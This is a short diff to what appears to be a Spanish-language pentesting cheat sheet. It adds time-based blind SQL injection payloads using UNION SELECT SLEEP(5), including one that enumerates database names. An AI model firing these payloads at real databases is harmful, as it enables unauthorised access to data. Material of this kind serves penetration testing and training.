@@ -99,6 +99,15 @@ UNION SELECT 1,2,3 from nombre_tabla where nombre_columna like '%' and nombre_co
 ```
 #### Time Based
 
+Injección 
+```
+UNION SELECT SLEEP(5),2,...; - --
+```
+Database enumeration
+```
+ UNION SELECT SLEEP(5),2 where database() like '%'; - --
+```
+
 # Powershell
 
 Descargar binarios
